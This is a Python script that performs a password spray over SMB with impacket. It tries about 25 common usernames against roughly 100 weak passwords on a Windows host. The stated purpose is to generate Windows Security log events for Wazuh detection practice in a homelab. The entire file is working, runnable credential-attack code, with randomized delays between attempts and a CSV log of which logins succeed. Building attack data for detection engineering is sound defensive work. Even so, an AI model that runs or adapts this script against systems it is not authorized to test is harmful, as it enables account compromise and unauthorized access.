#!/usr/bin/env python3
"""
password_spray.py

Password spray tool for the Wazuh Investigations homelab series.
Performs real SMB login attempts against a Windows target using impacket's
SMBConnection, in password-major order, to generate authentic Windows
Security event log data for detection engineering practice in Wazuh.

Environment:
    Kali (attacker):      192.168.30.30
    Windows 11 (target):  192.168.20.20

For lab use only. Only run this against systems you own and control.
"""

import argparse
import csv
import random
import time
from datetime import datetime

from impacket.smbconnection import SMBConnection

USERNAMES = [
    "administrator", "guest", "user", "test", "backup", "sql",
    "svc-backup", "helpdesk", "support", "root", "operator", "manager",
    "it-admin", "sysadmin", "webadmin", "dbadmin", "finance", "hr",
    "sales", "marketing", "dev", "qa", "temp", "info", "admin",
]

REAL_ACCOUNT = "admin"
REAL_PASSWORD = "44685"


def build_password_list():
    """Build 99 decoy passwords plus the real credential appended last.

    Real credential is placed last, and REAL_ACCOUNT is last in USERNAMES,
    so the final attempt of the run lands on the genuine admin:44685 login.
    """
    bases = [
        "password", "welcome", "letmein", "changeme", "qwerty",
        "admin", "root", "test", "temp", "backup", "guest",
        "iloveyou", "monkey", "dragon", "master", "shadow",
        "summer", "winter", "spring", "autumn", "football",
    ]
    suffixes = ["", "1", "12", "123", "1234", "!", "2024", "2025", "01"]

    decoys = []
    for base in bases:
        for suffix in suffixes:
            candidate = f"{base}{suffix}"
            if candidate not in decoys:
                decoys.append(candidate)
            if len(decoys) >= 99:
                break
        if len(decoys) >= 99:
            break

    decoys = decoys[:99]
    return decoys + [REAL_PASSWORD]


def attempt_login(target, username, password):
    """Attempt a single real SMB login. Returns True on success, False on failure."""
    try:
        conn = SMBConnection(target, target)
        conn.login(username, password)
        conn.close()
        return True
    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Password spray tool for the Wazuh Investigations lab"
    )
    parser.add_argument("--target", default="192.168.20.20",
                         help="Windows target IP, default 192.168.20.20")
    parser.add_argument("--min-delay", type=float, default=0.3,
                         help="Minimum delay between attempts in seconds")
    parser.add_argument("--max-delay", type=float, default=1.2,
                         help="Maximum delay between attempts in seconds")
    parser.add_argument("--round-delay", type=float, default=5.0,
                         help="Delay in seconds between password rounds")
    parser.add_argument("--log-file", default="password_spray_log.csv",
                         help="CSV file to write the attempt log to")
    args = parser.parse_args()

    passwords = build_password_list()
    total_attempts = len(USERNAMES) * len(passwords)

    print(f"Target: {args.target}")
    print(f"Usernames: {len(USERNAMES)}")
    print(f"Passwords: {len(passwords)}")
    print(f"Total attempts: {total_attempts}")
    print("Starting password spray, password-major order, one password across all usernames per round.\n")

    attempt_number = 0

    with open(args.log_file, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["attempt", "timestamp", "username", "password", "result"])

        for password in passwords:
            for username in USERNAMES:
                attempt_number += 1
                timestamp = datetime.now().isoformat()

                success = attempt_login(args.target, username, password)
                result = "SUCCESS" if success else "FAILURE"

                writer.writerow([attempt_number, timestamp, username, password, result])
                f.flush()

                print(f"[{attempt_number}/{total_attempts}] {username}:{password} -> {result}")

                delay = random.uniform(args.min_delay, args.max_delay)
                time.sleep(delay)

            time.sleep(args.round_delay)

    print(f"\nDone. {total_attempts} attempts logged to {args.log_file}")


if __name__ == "__main__":
    main()